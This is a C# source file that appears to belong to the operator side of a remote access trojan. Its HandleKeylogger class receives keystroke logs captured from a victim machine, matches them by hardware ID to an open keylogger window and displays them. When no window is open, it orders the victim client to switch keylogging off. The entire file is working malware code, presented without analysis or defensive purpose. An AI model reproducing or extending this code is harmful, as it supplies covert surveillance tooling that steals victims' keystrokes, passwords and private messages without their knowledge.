using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    class HandleKeylogger
    {
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                if (KL != null)
                {
                    if (KL.Client == null)
                    {
                        KL.Client = client;
                        KL.timer1.Enabled = true;
                    }
                    KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                    KL.richTextBox1.Text = KL.Sb.ToString();
                    KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                    KL.richTextBox1.ScrollToCaret();
                }
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                    msgpack.ForcePathObject("isON").AsString = "false";
                    client.Send(msgpack.Encode2Bytes());
                }
            }
            catch { }
        }
    }
}
